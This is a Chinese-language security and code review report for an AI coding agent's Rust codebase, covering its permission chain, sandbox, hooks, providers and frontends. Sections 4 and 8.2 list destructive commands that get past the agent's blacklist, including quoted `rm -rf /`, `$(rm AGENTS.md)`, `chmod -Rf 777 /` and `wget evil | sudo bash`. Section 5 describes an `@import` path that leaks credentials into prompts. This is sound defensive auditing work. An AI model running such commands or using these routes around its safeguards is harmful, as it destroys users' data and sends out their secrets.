# minicoding-rs 第四轮全面审查报告（R4，2026-08-26）

> 审查基线：commit `0fc60a0`（main，工作树干净），v0.3.5。
> 审查方式：六领域并行深审（运行时权限链 / Provider / policy·sandbox·hooks / context·memory·storage·mcp / server·四前端 / tools·文档·CI），关键结论均经人工二次验证（file:line 实读），对 R3 修复做对抗性验证。
> 本报告取代 `project-review-20260826-r3.md` 成为当前有效审查基线。
> 修复执行记录见本文 §10（随修复批次追加）。

---

## 0. 总体结论

R3 的修复工程质量整体过硬：**29 项已修条目中 24 项经对抗性验证通过**（RT-1/2/3/5~9、PTM-1/2/3/6/8/9/10/14、SEC-1~3/5/8/10/11/16/19、CTX-10、FE-1/2/3/6/7/8/11/13、ARCH-3~5、ENG-4/7/9/11 等），回归测试真实存在且方向 fail-closed。但本轮发现：

1. **R3 存在三条"静默丢弃"的计划项**——SEC-7 文档披露、SEC-12 Landlock truncate、SEC-17 redact 统一在 §11 计划中列明、§12 执行记录未交付、§12.1 未修清单也未登记，形成追踪黑洞；
2. **新落地的 SEC-1 黑名单缺乏对抗性自评**：`sh -c '…'` 引号包裹整体逃逸六类危险命令、`$()` 不参与切段写穿约束文件保护——两个初等变形即可绕过其自身承诺；
3. **两条"建成未通车"的 P1 功能链**：小 LLM 摘要请求体 `model:""` 对真实 API 必然 400（L2 压缩摘要/会话摘要静默降级为启发式）；asyncRewake 的 spawn 触发路径被恒假条件门死；
4. **CTX-2 修复只落在 SDK**：server 的 context_window 仍取 summary_provider（small model），同一 bug 的第二实例漏改。

**问题统计**：P1×6、P2×24、P3×25+。修复分七阶段执行（见 §9）。

---

## 1. R3 修复验证结论

### 1.1 验证通过（摘要）

| 领域 | 验证通过的条目 |
|---|---|
| 权限链 | RT-1 缓存门控物理删除早退+回归锁；SEC-3 决策入口 AllowAlways 折叠（弹满三次测试） |
| 配对 | RT-2 提醒改走 system prepend，配对不变式断言入 CI |
| 平台 | RT-3 Windows EACCES=5 显式排除 code 13+平台条件断言 |
| 热更新 | RT-5 显式覆盖集合替代基线比对；RT-9 单次解析 |
| Provider | PTM-1 usage 合并 max/快照语义无反向覆盖；PTM-2 tokenizer 含 tool_calls；PTM-3 thinking gate 不误伤纯思考；PTM-8 Ollama ULID id 回灌合法；PTM-9 三断点≤4；PTM-14 clamp 32k |
| 工具 | PTM-6 git ref 白名单校验（`-`前缀/`..`/`@{`/空白全拦）+回归锁；env_clear 到位 |
| 沙箱 | SEC-8 seccomp 三 arch；SEC-16 签名表；SEC-19 SSRF 补段 |
| Server/前端 | SEC-2 confirm_danger 双入口+审计落盘；FE-1 durable recovery 三态可达；FE-3 Rehydrate id 用实际 seq；FE-6 cancellable=false；FE-7 pending 表 retain 清理；FE-8 六小时空闲驱逐；FE-11 stdio preset 统一；FE-13 端口 env 直传 |
| 工程 | ARCH-3 五 crate 架构守卫补齐；ARCH-4 KEYRING_SERVICE 收敛 core；ENG-4 TUI tracing 安装；ENG-7 dependabot；ENG-9 双轨钩子对齐；ENG-11 SHA 钉版 |

### 1.2 静默丢弃项（计划了、没做、也没登记开放项）

| 编号 | 计划位置 | 现状 |
|---|---|---|
| SEC-7 文档披露 | R3 §11-R3-6 | security.md:381 仍称 Linux"默认禁 TCP/UDP"，与 linux.rs 自身诚实注释矛盾 |
| SEC-12 Landlock ABI<V3 | R3 §11-R3-6 | truncate(2) 在旧内核不受约束且无降级警告 |
| SEC-17 redact 统一 | R3 §11-R3-6 | 两套 redact 并存且关键词/前缀表分叉（见 §5-F8） |
| FE-14 ACP 方法名 | R3 §6.2 | acp.rs 仍用 `newConversation`，非官方 `session/new` 规范 |
| ENG-10 coverage 结构 | R3 §9.2 | ci.yml:110 `|| true` 恒成功仍在；cli/tui/server 仍在 80% 门禁外 |

另：R3 §5.1 "redact 前 4 字符+*** 达标"结论与代码不符（两套实现均为整体替换 `***`）。

---

## 2. 运行时与权限链

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| RT4-1 | **P1** | **沙箱拒绝早退漏发 `ToolCallFinished`**：`execute_allowed_call` 中 denial 分支提前 return，跳过函数尾部成对的 Finished 事件与 metrics——每次权威拒绝让 SSE/TUI/Web 工具卡片永久悬挂 running 态。对比：权限拒绝路径有专门的 `emit_denied_lifecycle` 成对补发；只读桶拒绝路径也正确发 Finished | core/runtime/permission.rs:769-772（对照 :801-804） |
| RT4-2 | P2 | **SEC-11 审计未覆盖只读并行桶**：带审计的 `handle_sandbox_denial` 仅副作用路径调用；只读桶直调静态 `build_denial_result`——熔断计数共用但审计缺失，最值得取证的事件无痕 | rt.rs:1314-1321 vs denial.rs:148 |
| RT4-3 | P2 | **RT-2 只阻断新增污染，存量不自愈**：旧版本插入的夹层 System 消息已随 snapshot 落盘，`repair_request_messages` 不识别不移除——窗口期会话 resume 后仍持续 400 死局（OpenAI 断 tool 配对 / Anthropic roles alternate） | repair.rs:258-279 |
| RT4-4 | P2 | **policy.toml 路径级 allow/deny 不互斥清理**：工具级 setter 互相清理对方表，路径级不清理；同键冲突查询时 deny 恒胜（等长比较 `d < a` 为 false）→ 用户先 DenyAlways 后改主意 AllowAlways 被静默忽略 | persist.rs:107-108,148-168 |
| RT4-5 | P3 | **DenyAlways 未对称校验**：决策入口只校验 AllowAlways 是否提供过；失控前端回传 DenyAlways 可把跨会话全局 deny 落盘（fail-closed 方向，但违背"约束在 core 强制"原则） | permission.rs:597-599 |
| RT4-6 | P3 | contains_directive 残余绕过：零宽字符（`Ne\u{200b}ver`）、双空格变体（`Do  not`）、HTML 注释行不剥离 | core/util/mod.rs:46-105 |
| RT4-7 | P3 | pending_hook_contexts 跨 turn 泄漏：硬停止/max_iters/cancel 后缓冲残留到下一用户轮首请求 system 头部 | rt.rs:702-710（唯一 drain 点 :595） |
| RT4-8 | P3 | persisted 规则命中审计溯源失真（记为 "policy allowed"，无法区分用户 Always@dir 授权）；Hook 直出 Allow/BypassPermissions 放行同病 | permission.rs:574-579,937-948 |
| RT4-9 | P3 | InteractivePrompter 受限 prompt 仍显示并接受 `[a]始终允许`（`has_always` 把 DenyAlways 当总开关）；core 折叠兜底使其无实害但菜单承诺失真 | policy/prompter.rs:89-108 |
| RT4-10 | P3 | set_model 登记覆盖与配置写入顺序存在竞态窗口；Mutex 中毒静默跳过登记 | rt.rs:236-250 |
| RT4-11 | P3 | 多指纹同轮命中阈值时提醒选择不确定（HashMap 迭代序）；未发送提醒的 fp 也被标记已提醒 | rt.rs:675-712 |
| RT4-12 | P3 | normalize_lexical_rel_path 仅按 `/` 分割，Windows 反斜杠相对路径 `..` 不规范化 | util/mod.rs:165 |

---

## 3. Provider 层

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| PT4-1 | **P1** | **小 LLM 摘要/压缩请求体 `model:""` 必 400**：注释宣称"provider 使用自身默认模型"，但 M-12 后三家 provider 一律取 `params.model` 无回退——L2 压缩摘要与会话结束摘要对真实 OpenAI/Anthropic/Ollama 必然失败，静默降级启发式兜底，功能整体空转；mock 测试忽略 model 字段故全绿 | memory/session_sum.rs:164-167、context/compress/fallback.rs:127-129（对照 openai.rs:122） |
| PT4-2 | P2 | **`LlmError::Filtered` 有定义无生产者**：OpenAI `finish_reason=="content_filter"` 归入 Stopped（注释自认待接线）；`delta.refusal` 完全不解析——内容过滤呈现为正常结束 | openai.rs:498-508,394-451 |
| PT4-3 | P2 | `ContextLength`/`AuthInvalid` 分类后无消费方：Runtime 不按 ContextLength 触发紧急压缩，CLI 不按 AuthInvalid 引导换 key——PTM-7 闭环只做了生产端 | error.rs:72-84 全仓 grep |
| PT4-4 | P2 | PTM-1 核心行为变更零测试防护：`merge_incremental` 无单测，accumulator/anthropic mock 流均不含 Usage 场景——下次重构极易回归且 CI 无法发现 | provider/trait.rs:108-119 |
| PT4-5 | P2 | `stream_options`/`prompt_cache_key` 无条件下发：严格 OpenAI 兼容网关（老 vLLM 等）可能 400 | openai.rs:125,130-132 |
| PT4-6 | P3 | SSE 混合行尾边界漏识别：`\n\r\n` 跨界序列不在三种分隔符内→两事件合并解析失败（需服务端中途切换行尾，概率低） | common/sse.rs:70-75 |
| PT4-7 | P3 | NDJSON 超限无熔断 latch（SSE 有）；SSE 每 chunk 全量重扫 buffer O(n²) 面 | ndjson.rs:88-92 vs sse.rs:100 |
| PT4-8 | P3 | tokenizer 选型缺 o4/gpt-5 前缀（落 cl100k 而 uses_max_completion_tokens 认定推理系）——两处模型族判定不一致 | tokenizer.rs:87-96 vs openai.rs:458 |
| PT4-9 | P3 | `OLLAMA_NUM_CTX` 恒插 num_ctx：用户 Modelfile 配 32K 被压回 8192；`=0` 无下界校验 | ollama.rs:169-173 |
| PT4-10 | P3 | `compute_max_tokens(Some(0),…)` 产出 `max_tokens:0` 必 400 | anthropic.rs:563-584 |
| PT4-11 | P3 | OpenAI thinking_budget 静默忽略（trait 声称映射 reasoning_effort），与 Anthropic 显式报错不对称（当前生产不可达） | openai.rs:112-176 |

---

## 4. 安全（policy / sandbox / hooks）

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| SE4-1 | **P1** | **`sh -c '…'` 引号包裹整体逃逸黑名单**：tokenize 剥引号后 `"rm -rf /"` 成单个带空格 token，verb=`bash` → 六类 match 全落空。BypassPermissions/full-access 场景零阻力直达执行 | builtin.rs:468-510,396-434 |
| SE4-2 | **P1** | **`$()` 不参与切段写穿约束文件保护**：切段字符集无 `$(`，`$(rm AGENTS.md)` 整段 verb=`"$(rm"` ∉ WRITE_VERBS、目标尾括号精确匹配失败——C-23/S5 保护失效；预批准清单却含 `$(`，两处语义不一致 | builtin.rs:313-319（对照 :143） |
| SE4-3 | P2 | curl\|sh 三缺口：`| sudo sh`（紧邻词非 shell）、`\| python3/node/perl`（解释器族缺失）、`bash <(curl …)`（进程替换无管道） | builtin.rs:440-465 |
| SE4-4 | P2 | `>&` 重定向变体不在 REDIRECTS：tokenizer 能产出 `">&"`（POSIX 等价 `> x 2>&1`），`echo pwned >& AGENTS.md` 写穿 | builtin.rs:300 vs :489-496 |
| SE4-5 | P2 | chmod/chown 组合旗标 `-Rf`/`-fR` 不识别（rm 有 is_recursive_flag，chmod 是精确匹配）——`chmod -Rf 777 /` 放行 | builtin.rs:424-429 |
| SE4-6 | P2 | 约束文件目标动词白名单逃逸族：eval/command/xargs/find -delete/install/ln -sf/patch/git clean -fdx/python -c 均可写删 AGENTS.md——建议方向反转为"命中保护目标即 Deny，除非段内有明确纯读动词" | builtin.rs:260-299 |
| SE4-7 | P2 | `dd of=/dev/null` 被硬 Deny 且 C-02 不可覆盖——磁盘测速/丢弃输出的常见合法用法误杀 | builtin.rs:412 |
| SE4-8 | P2 | 两套 redact 并存且行为分叉（SEC-17 未统一）：run.rs 版有 `sk-/ghp_/AKIA` 前缀表，policy 版有关键词表——同一密钥经 shell.run 输出脱敏、经 fs.read 回灌原样泄漏；且两版都不满足 C-04"前 4 字符+***"规范 | tools/shell/run.rs:306-433 vs policy/redact.rs:42-166 |
| SE4-9 | P2 | SEC-9 半修：弱化平行实现 policy/ssrf.rs 仍是死代码未删，rules.md:223 C-02 映射仍指它（未来接线即引入劣化防线） | policy/ssrf.rs 全文 |
| SE4-10 | P2 | SEC-12 未修：Landlock ABI<V3 时 truncate(2) 不受约束且无 warn | linux.rs:122-137,249-251 |
| SE4-11 | P2 | asyncRewake spawn 触发路径不存在：唯一 try_spawn 点被 `PreToolUse.supports_async_rewake()`（恒 false）门死；三类支持事件的 DispatchResult.async_rewake 被注释"暂不处理"直接丢弃——hooks.md §11 承诺端到端为零 | permission.rs:444-446,843 |
| SE4-12 | P2 | 内置示例 Hook `AutoApproveTests` 危险：前缀匹配自动 Allow，无复合操作符防护——`cargo test && wget evil \| sudo bash` 经 Hook 自动批准（policy 层同类场景有完整操作符拦截，强度悬殊）；头注自称可开箱注册 | hooks/builtin.rs:190-205 |
| SE4-13 | P2 | hooks registry `span.enter()` guard 跨 await（RT-7 同型漏网实例） | hooks/registry.rs:72-81 |
| SE4-14 | P3 | ScriptHook stdout 截断发生在全量缓冲之后（C-07 名不符实）；stderr 无上限；超时不杀孙进程（无进程组） | hooks/script.rs:158-191 |
| SE4-15 | P3 | Windows FIFO 残余：apply 入队后 spawn 失败遗留 stale 条目（下次 post_spawn pop 别人的策略）；ReadOnly/WorkspaceWrite Job Object 无差异未文档化 | windows.rs:37-54,150-180,239 |
| SE4-16 | P3 | denial 签名顺序使 landlock TCP 拒绝先命中通用 EPERM 文本→归因 `EPERM/syscall_blocked` 失真（advisory/authoritative 不受影响） | sandbox/denial.rs:24-29 |
| SE4-17 | P3 | seccomp clone(CLONE_NEWUSER) 命名空间标志位仍未过滤（userns 逃逸原语部分敞开） | seccomp.rs:45-66 |
| SE4-18 | P3 | seatbelt_escape 不转义反斜杠：尾 `\` 路径产生未闭合 profile（fail-closed 方向，可用性问题） | macos.rs:102-111 |
| SE4-19 | P3 | FmtOnWrite 格式化器改写不经 Journal（/undo 盲区）；BlockSecrets 模式表匹配不上 JSON 键引号形态（示例级） | hooks/builtin.rs:274-296 |

---

## 5. 上下文 / 记忆 / 存储 / MCP

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| CT4-1 | **P1** | **server CTX-2 未修**：context_window 仍取 `summary_provider.capabilities()`（small 优先）——主 ollama(8192)+small OpenAI(128000) 组合预算虚高 15 倍→压缩永不触发→真实超窗 | server/runtime_builder.rs:198（SDK 已修 builder.rs:367） |
| CT4-2 | P1 | **压缩目标未扣固定开销**：触发判定计 system+tools（effective_tokens），压缩管道收敛目标仍是 messages-only compact_threshold——fixed_overhead 大时压缩"成功"后仍超窗且熔断被 record_success 重置，每轮白烧一次 L2 摘要 | manager.rs:288-350,552-574 |
| CT4-3 | P2 | **project_doc @import 无路径包含约束**：接受任意绝对路径——恶意仓库 `@import /home/u/.aws/credentials` 把凭证展开进 system prompt 外发（数据外泄通道）；post_compact 已有同款包含检查，@import 缺位 | memory/project_doc/loader.rs:290-320,344-375 |
| CT4-4 | P2 | MCP 任何调用失败触发全池 restart：业务错误（ToolNotFound/参数错/单工具超时）同样重启所有子进程；并发失败多路 restart 竞争；重建期间 call 全程持 read 锁排队 | mcp/client/wrapper.rs:125-136、rmcp.rs:463-470,520 |
| CT4-5 | P2 | warm_up 无生产调用方（list_changed 失效：新增工具永不注册、已删工具 stale wrapper 必失败再引发 CT4-4）；warm_up 内不再应用 enabled_tools 过滤；非法名以裸名注册兜底与 start 路径报错口径不一致 | mcp/rmcp.rs:629-677、sdk/mcp_setup.rs:79-95 |
| CT4-6 | P2 | L3/L4 完全忽略 pinned 标记：weight 定义 manual_pin×2.0"压缩时不裁剪"，rolling/hard_truncate 选择器一律不豁免 | compress/rolling.rs:44-66、hard_truncate.rs:62-76 |
| CT4-7 | P2 | 会话摘要仅 CLI REPL 一端通车：TUI sidebar 引用不存在的 `/summary` 命令（误导文档）；server 删除会话不生成 summary；单次模式 exit 前不摘要 | tui/sidebar.rs:12、session_mgr.rs、cli/main.rs:360 |
| CT4-8 | P2 | 双轨 builder 差距（server 缺）：PromptPipeline（AGENTS.md/long_term/auto/@memory 注入全失效——Web 端项目规则与记忆静默丢失）、set_audit（压缩审计不落盘）、memory.write、MCP attach、Hook/ConfigWatcher/PolicyPersist | runtime_builder.rs 全文 vs sdk/builder.rs |
| CT4-9 | P3 | clip_text 行数不足分支零缩减却计 clipped_count；Json 分支连续两次 pretty 序列化 | compress/clip.rs:63-72,111-128 |
| CT4-10 | P3 | EventStore.append 每次 O(全文) 读盘校验 seq（长会话每事件全文读） | event_store.rs:126-143 |
| CT4-11 | P3 | EventStore 尾行崩溃半写损坏使 next_seq 整体 Err（前面合法事件不可用）——消息流是跳坏行策略，不对称 | event_store.rs:68-83,174-215 |
| CT4-12 | P3 | auto_contributor 模块文档过时（"CLI 暂无 per-turn 写入点"实际已接线）；retrieval 同名节后者覆盖前者无声丢内容 | auto_contributor.rs:17-19、retrieval.rs:63 |
| CT4-13 | P3 | journal undo split_off 后释放锁做 IO，并发 record 使 failed_entries 回推次序错位（不丢数据） | journal_impl.rs:102-161 |
| CT4-14 | P3 | audit.log 跨进程 append 无文件锁（O_APPEND 保偏移不保行完整）；MCP inflight 合并的后来者不计 metrics | audit.rs:34-47、rmcp.rs:496-512 |

---

## 6. Server 与四前端

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| FE4-1 | P2 | **Web PermissionDialog 注释与代码不符**：注释声称"按 pending.options 渲染"，实际恒渲染四按钮 CHOICES；服务端 pending 快照返回 `options: Vec::new()` 恒空；协议 DTO PermissionRequested 无 options 字段——C-23 受限 prompt 在 Web 仍显示"始终允许"按钮（core 折叠兜底使其无害化，但 UI 误导+多一次审计告警） | web/components/permission/PermissionDialog.tsx:38-50、server/prompter.rs:88 |
| FE4-2 | P2 | **Desktop 发 sidecar-exited 但 Web 无监听**：sidecar 崩溃通知事件前端零消费——FE-12 半修，用户仍无感知 | desktop/sidecar.rs:340 vs web/api/tauri.ts（无 listen） |
| FE4-3 | P2 | ACP 方法名仍用 `newConversation` 等私有命名（FE-4 静默丢弃）：官方规范 session/new、session/prompt——Zed 直连大概率 method_not_found；features.md E-12 却称"可被 Zed 等客户端嵌入" | acp.rs:13,95,362 |
| FE4-4 | P3 | event-guard Zod 校验浅层：passthrough 仅验 type 枚举与 seq，payload 字段漂移不可检测（AGENTS §8.4 意图是防 schema 漂移） | web/api/event-guard.ts:32-37 |
| FE4-5 | P3 | roadmap/features T-13 称 task.spawn"生产通路已打通"，server 端 runner 实为 Noop（NotConfigured）——文档半真，四形态能力矩阵再次失真 | features.md:67 vs runtime_builder.rs:320-328 |
| FE4-6 | P3 | evict_idle_sessions 用 turn_lock.try_lock 探测忙——权限等待中会话确实持锁（安全），但驱逐时机仅在 create/list 入口，长尾流量下表仍可增长（可接受取舍，记录备查） | session_mgr.rs:285-330 |

---

## 7. 文档与工程化

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| DOC4-1 | P2 | rules.md:223 C-02 映射指向死代码 policy/ssrf.rs（应指 tools/web/ssrf.rs） | docs/rules.md |
| DOC4-2 | P2 | security.md Linux 网络承诺夸大（SEC-7 披露未做）："默认禁 TCP/UDP"实为仅禁 TCP 且 seccomp opt-in | docs/security.md:381 |
| DOC4-3 | P2 | features.md:67 T-13"已接入生产通路"对 server/Web/Desktop 不成立（见 FE4-5） | docs/features.md |
| DOC4-4 | P3 | R3 报告 §5.1 redact 结论失实（"前 4 字符+*** 达标"与两套实现均不符）——随 SE4-8 修复后在 R4 报告勘误 | project-review-20260826-r3.md |
| DOC4-5 | P3 | ENG-10 残留：coverage visibility 步骤 `\|\| true` 恒成功不上传；cli/tui/server 结构性排除在 80% 门禁外（登记开放项而非冒险收紧） | ci.yml:106-119 |
| DOC4-6 | P3 | hooks/builtin.rs AutoApproveTests/FmtOnWrite 示例风险未在 hooks.md 标注"生产禁用/undo 盲区" | docs/hooks.md |

---

## 8. 可靠性与风险综合评估

### 8.1 生产就绪度评分（5 分制，较 R3 变化）

| 维度 | R3 | R4 | 说明 |
|---|---|---|---|
| 架构健康度 | 4.5 | 4.5 | 守卫强制持续有效；双轨 builder 仍未合并 |
| 安全防线深度 | 3.0 | 3.5 | 黑名单从幻影到落地（+），但初等变形绕过暴露自评缺失（−）；redact/ssrf 幻影残留（−） |
| 正确性可靠性 | 3.0 | 3.5 | R3 修复质量高（+）；新增发现集中在完整性缺口（ToolCallFinished/空 model/压缩目标）（−） |
| 功能完整性 | 3.5 | 3.5 | 摘要/检索/asyncRewake 仍"建成未通车" |
| 一致性 | 3.0 | 3.0 | server 双轨差距依旧（pipeline/记忆注入全缺席） |
| 文档可信度 | 3.5 | 3.5 | 三条静默丢弃项暴露执行追踪漏洞；T-13/E-12 半真 |
| 工程化 | 4.0 | 4.0 | dependabot/SHA 钉版到位；coverage 结构性问题保留 |

### 8.2 Top 风险（攻击者视角，更新）

1. `sh -c 'mkfs.ext4 /dev/sda1'`：full-access/BypassPermissions 场景黑名单零阻力（SE4-1）
2. 会话级 Always 后 `echo $(rm AGENTS.md)`：C-23 同会话内失效（SE4-2）
3. `@import ~/.aws/credentials`：凭证进 system prompt 外发（CT4-3）
4. `cargo test && wget evil | sudo bash`：示例 Hook 自动批准链（SE4-12 + SE4-3 sudo 缺口）
5. server small-provider 窗口虚高 → ollama 用户必然超窗 400（CT4-1）

---

## 9. 修复计划（七阶段）

| 阶段 | 范围 | 关键项 |
|---|---|---|
| R4-1 | 词法黑名单补强 | SE4-1 sh -c 递归判定、SE4-2 $() 切段、SE4-3 sudo 跳过/解释器族/<()、SE4-4 >&、SE4-5 chmod -Rf、SE4-7 /dev/null 豁免 + 回归锁 |
| R4-2 | 运行时正确性 | RT4-1 Finished 补发、RT4-2 只读桶审计、RT4-3 repair 剥夹层 System、RT4-4 路径互斥清理、RT4-5 DenyAlways 对称、RT4-6 零宽归一、RT4-7 turn 末清缓冲、RT4-8/9 审计注记与 prompter 键位 |
| R4-3 | Provider | PT4-1 空 model 修复、PT4-2 Filtered 接线、PT4-4 merge 测试、PT4-8~10 小项 |
| R4-4 | Context/Server 对齐 | CT4-1 server 窗口、CT4-2 压缩目标扣开销、CT4-3 @import 包含约束、CT4-6 pinned 豁免、CT4-9 clip 计数 |
| R4-5 | MCP/Hooks | CT4-4 连接级才 restart、SE4-12 示例 Hook 加固、SE4-13 instrument、SE4-10 ABI warn |
| R4-6 | 前端 | FE4-1 options 渲染贯通（协议→pending→Dialog）、FE4-2 sidecar-exited 监听、CT4-7 sidebar 失实注释 |
| R4-7 | 文档 | DOC4-1~6 + 开放项登记（FE4-3 ACP 规范对齐、双轨 builder 合并、thinking 持久化等维持 roadmap） |

**有意未修项（登记 roadmap）**：FE4-3（ACP 方法重命名涉及协议破坏性变更，需与客户端协调）、CT4-5（list_changed 订阅需 rmcp 事件循环改造）、双轨 builder 合并（大改造）、PT4-3（ContextLength 紧急压缩联动需 Runtime 状态机设计）、SE4-15（Windows FIFO 关联句柄传递）、CI coverage 结构性收紧（需先补三入口集成测试资产）。

## 10. 修复执行记录（随批次追加）

（占位——各阶段完成后回填提交哈希与覆盖问题编号）
